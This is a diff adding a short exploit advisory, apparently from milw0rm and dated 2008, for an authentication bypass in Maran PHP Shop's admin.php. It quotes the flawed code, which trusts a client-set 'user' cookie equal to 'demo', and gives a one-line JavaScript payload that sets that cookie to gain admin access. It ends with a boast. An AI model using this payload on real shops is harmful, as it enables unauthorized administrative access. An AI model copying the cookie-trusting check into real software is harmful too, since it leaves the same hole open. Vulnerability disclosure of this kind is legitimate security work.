@@ -1,0 +1,25 @@
+# Maran PHP Shop (admin.php) Insecure Cookie Handling Vulnerability
+# url: http://www.maran.pamil-visions.com/maranshop.php
+#
+# Author: JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://spanish-hackers.com
+# team: Spanish Hackers Team - [SHT]
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+
+vuln file: /admin.php
+vuln code:
+<?
+$readcookie = $_COOKIE['user'];
+if($readcookie!="demo"){echo "error 467. bad login! <a href='login.php'>login here</a>";exit;}
+//echo $_COOKIE['user'];
+?>
+
+exploit:
+javascript:document.cookie = "user=demo; path=/";
+
+Hack0wn :D
+
+# milw0rm.com [2008-11-02]
